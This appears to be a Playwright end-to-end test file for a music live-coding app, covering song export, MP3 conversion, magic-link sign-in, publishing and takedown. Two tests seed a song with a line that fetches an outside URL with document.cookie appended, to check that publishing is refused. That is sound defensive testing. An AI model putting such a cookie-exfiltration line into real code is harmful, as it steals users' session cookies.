import { expect, test, type Page } from '@playwright/test'
import { readFileSync } from 'node:fs'

const SONG = 'setcpm(120/4)\n\nvoc: s("long_take")\n'
const RATE = 44100
const LEAD = 0.05

// Twelve seconds of a tone as a 16 bit WAV file, a little over a megabyte, with a twentieth of
// a second of silence in front so that where it starts can be told.
function longTake(): Buffer {
    const frames = RATE * 12
    const file = Buffer.alloc(44 + frames * 2)
    file.write('RIFF', 0, 'latin1')
    file.writeUInt32LE(36 + frames * 2, 4)
    file.write('WAVEfmt ', 8, 'latin1')
    file.writeUInt32LE(16, 16)
    file.writeUInt16LE(1, 20)
    file.writeUInt16LE(1, 22)
    file.writeUInt32LE(RATE, 24)
    file.writeUInt32LE(RATE * 2, 28)
    file.writeUInt16LE(2, 32)
    file.writeUInt16LE(16, 34)
    file.write('data', 36, 'latin1')
    file.writeUInt32LE(frames * 2, 40)
    for (let at = Math.round(RATE * LEAD); at < frames; at++) file.writeInt16LE(Math.round(Math.sin((at / RATE) * 2 * Math.PI * 330) * 20000), 44 + at * 2)
    return file
}

async function open(page: Page, song = SONG) {
    await page.addInitScript((text) => {
        if (!sessionStorage.getItem('seeded')) {
            localStorage.setItem('weft.song', text)
            sessionStorage.setItem('seeded', '1')
        }
    }, song)
    await page.goto('/')
    await page.waitForFunction(() => Boolean((window as any).__weft))
    await expect(page.getByTestId('sounds')).toHaveText('Sounds ready', { timeout: 30000 })
}

async function addLongTake(page: Page) {
    await page.getByRole('button', { name: 'Sounds', exact: true }).click()
    await page.getByTestId('sound-browser').getByRole('radio', { name: /^Yours/ }).click()
    await page.getByTestId('own-files').setInputFiles([{ name: 'long take.wav', mimeType: 'audio/wav', buffer: longTake() }])
    await expect(page.getByTestId('sound-browser').locator('.sb-i code')).toHaveText('long_take')
}

const prepare = (page: Page) => page.evaluate(() => (window as any).__weft.prepareToPublish())

// Where the sound the app keeps under this name starts, in seconds, and what kind of file it is.
const kept = (page: Page, name: string) =>
    page.evaluate(async (wanted) => {
        const database = await new Promise<IDBDatabase>((resolve, reject) => {
            const request = indexedDB.open('weft', 1)
            request.onsuccess = () => resolve(request.result)
            request.onerror = () => reject(request.error)
        })
        const sound = await new Promise<{ type: string; data: ArrayBuffer }>((resolve, reject) => {
            const request = database.transaction('sounds').objectStore('sounds').get(wanted)
            request.onsuccess = () => resolve(request.result)
            request.onerror = () => reject(request.error)
        })
        const heard = await (window as any).__weft.engine.decodeAudio(sound.data.slice(0))
        const samples: Float32Array = heard.channels[0]
        let peak = 0
        for (const sample of samples) peak = Math.max(peak, Math.abs(sample))
        const first = samples.findIndex((sample) => Math.abs(sample) >= peak * 0.1)
        return { type: sound.type, onset: first / heard.sampleRate }
    }, name)

test('a song file that is exported holds its sounds as they are, however large', async ({ page }) => {
    await open(page)
    await addLongTake(page)
    await page.getByTestId('song-name').click()
    await page.getByTestId('song-menu').getByRole('button', { name: 'Export', exact: true }).click()
    const dialog = page.getByTestId('export')
    await expect(dialog.getByRole('button', { name: /small/i })).toHaveCount(0)
    const [download] = await Promise.all([page.waitForEvent('download'), dialog.getByRole('button', { name: 'Song file (.weft)', exact: true }).click()])
    const text = readFileSync((await download.path())!, 'utf8')
    expect(text.length).toBeGreaterThan(1024 * 1024)
    const packed = JSON.parse(text).sounds[0]
    expect(packed).toMatchObject({ name: 'long_take', file: 'long take.wav', type: 'audio/wav' })
    expect(packed.onset).toBeUndefined()
    expect(Buffer.from(packed.data, 'base64').equals(longTake())).toBe(true)
})

test('for publishing the sounds are made into MP3 so the file fits, and they start where they did when it is opened', async ({ page, browser }) => {
    await open(page)
    await addLongTake(page)
    const made = await prepare(page)
    expect(made).toMatchObject({ ok: true, kbps: 128 })
    expect(made.text.length).toBeLessThan(400 * 1024)
    const packed = JSON.parse(made.text).sounds[0]
    expect(packed).toMatchObject({ name: 'long_take', file: 'long take.mp3', type: 'audio/mpeg' })
    expect(Math.abs(packed.onset - LEAD)).toBeLessThan(0.003)

    const other = await (await browser.newContext()).newPage()
    await other.goto('/')
    await other.waitForFunction(() => Boolean((window as any).__weft))
    await expect(other.getByTestId('sounds')).toHaveText('Sounds ready', { timeout: 30000 })
    await other.getByTestId('song-name').click()
    await other.getByTestId('song-file').setInputFiles({ name: 'Untitled.weft', mimeType: 'application/json', buffer: Buffer.from(made.text) })
    await expect(other.getByTestId('song-note')).toContainText('with 1 sound of its own')
    const after = await kept(other, 'long_take')
    expect(after.type).toBe('audio/wav')
    expect(Math.abs(after.onset - LEAD)).toBeLessThan(0.003)
    await other.context().close()
})

test('a song with code that is more than music is not made ready for publishing', async ({ page }) => {
    await open(page, 'setcpm(120/4)\n\ndrums: s("bd*4")\nfetch("https://example.com/" + document.cookie)\n')
    expect(await prepare(page)).toEqual({ ok: false, refused: { why: 'code', what: 'fetch is not something a song can use', line: 4 } })
})

const SYNTHS = 'setcpm(120/4)\n\nbass: note("c2 c3 c2 e2").s("sawtooth").lpf(600)\n\nlead: note("c4 e4 g4 e4").s("triangle")\n'
const dialog = (page: Page) => page.getByTestId('publish')
const someone = () => `ante+${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}@example.com`

async function openPublish(page: Page) {
    await page.getByTestId('song-name').click()
    await page.getByTestId('song-menu').getByRole('button', { name: 'Publish', exact: true }).click()
    await expect(dialog(page)).toBeVisible()
}

// Signing in the way it goes on one's own machine: the link is handed back, opened in another
// page, and its button pressed there.
async function signIn(page: Page, email = someone()) {
    await dialog(page).getByLabel('Your name, as it stands beside your songs').fill('Ante')
    await dialog(page).getByLabel('Your address').fill(email)
    await dialog(page).getByRole('button', { name: 'Send me a link', exact: true }).click()
    await expect(dialog(page)).toContainText(`A link is on its way to ${email}`)
    const link = await page.getByTestId('publish-link').getAttribute('href')
    const other = await page.context().newPage()
    await other.goto(link!)
    await expect(other.getByRole('heading', { name: 'Sign in to Weft' })).toBeVisible()
    await other.getByRole('button', { name: 'Sign in', exact: true }).click()
    await expect(other.getByRole('heading', { name: 'You are signed in' })).toBeVisible()
    await other.close()
    await expect(page.getByTestId('publish-count')).toHaveText('You have used 0 of your 10 songs.')
}

test('a song is published from the app: sign in with a link, say what it is, and it is on the site', async ({ page }) => {
    await open(page, SYNTHS)
    await openPublish(page)
    await expect(dialog(page)).toContainText('You sign in with a link sent to your address')
    await signIn(page)
    await expect(page.getByTestId('publish-note')).toContainText('The song file is')

    await dialog(page).getByPlaceholder("What people read on the song's page").fill('Two synths going round.')
    await dialog(page).getByPlaceholder('One tag, in your own words').fill('test tone')
    await dialog(page).getByRole('radio', { name: /CC0/ }).click()
    await dialog(page).getByRole('button', { name: 'Publish', exact: true }).click()
    await expect(dialog(page)).toContainText('Untitled is published.', { timeout: 40000 })
    const address = (await dialog(page).locator('.pb-url').textContent())!.trim()
    expect(address).toMatch(/^http:\/\/127\.0\.0\.1:5191\/songs\/[a-z0-9]+$/)

    const file = await page.request.get(`${address}.weft`)
    expect(JSON.parse(await file.text())).toMatchObject({ weft: 1, name: 'Untitled', code: SYNTHS, sounds: [] })
    const preview = await page.request.get(`${address}.mp3`)
    expect(preview.headers()['content-type']).toBe('audio/mpeg')
    const bytes = (await preview.body()).length
    expect(bytes).toBeGreaterThan(200 * 1024)
    expect(bytes).toBeLessThan(700 * 1024)
    const songPage = await page.context().newPage()
    await songPage.goto(address)
    await expect(songPage.getByRole('heading', { name: 'Untitled' })).toBeVisible()
    await expect(songPage.locator('body')).toContainText('by Ante')
    await expect(songPage.locator('body')).toContainText('Two synths going round.')
    await expect(songPage.locator('body')).toContainText('test tone, 120 bpm, 2 patterns, CC0')
    await songPage.close()

    await dialog(page).getByRole('button', { name: 'Close', exact: true }).click()
    await openPublish(page)
    await expect(page.getByTestId('publish-count')).toHaveText('You have used 1 of your 10 songs.')
    const mine = page.getByTestId('publish-mine')
    await expect(mine).toContainText('Untitled')
    await mine.getByRole('button', { name: 'Take down', exact: true }).click()
    await mine.getByRole('button', { name: 'Yes, take Untitled down', exact: true }).click()
    await expect(page.getByTestId('publish-count')).toHaveText('You have used 0 of your 10 songs.')
    expect((await page.request.get(address)).status()).toBe(404)

    await dialog(page).getByRole('button', { name: 'Sign out', exact: true }).click()
    await expect(dialog(page).getByLabel('Your address')).toBeVisible()
})

test('a song with code that is more than music cannot be published from the app', async ({ page }) => {
    await open(page, `${SYNTHS}fetch("https://example.com/" + document.cookie)\n`)
    await openPublish(page)
    await signIn(page)
    const refused = page.getByTestId('publish-refused')
    await expect(refused).toContainText('This song cannot be published')
    await expect(refused).toContainText('Line 6: fetch is not something a song can use. A song may hold only music code')
    await expect(dialog(page).getByRole('button', { name: 'Publish', exact: true })).toBeDisabled()
})

test('the half minute people hear starts where most of the song plays for all of it, and can be moved', async ({ page }) => {
    await open(page, 'setcpm(120/4)\n\nbass: note("c2").s("sawtooth").mask("<0!4 1!28>")\n\nlead: note("c4").s("triangle").mask("<0!8 1!16 0!8>")\n\nhigh: note("c5").s("sine").mask("<0!30 1!2>")\n')
    await openPublish(page)
    await signIn(page)
    await expect(page.getByTestId('publish-from')).toHaveText('9')
    await dialog(page).getByRole('button', { name: 'An earlier bar', exact: true }).click()
    await expect(page.getByTestId('publish-from')).toHaveText('8')
})

test('a name is asked for before a link is sent, and stands beside the song', async ({ page }) => {
    await open(page, SYNTHS)
    await openPublish(page)
    await dialog(page).getByLabel('Your address').fill(someone())
    await dialog(page).getByRole('button', { name: 'Send me a link', exact: true }).click()
    await expect(page.getByTestId('publish-note')).toHaveText('Type the name that should stand beside your songs.')
    await expect(dialog(page).getByLabel('Your address')).toBeVisible()
})
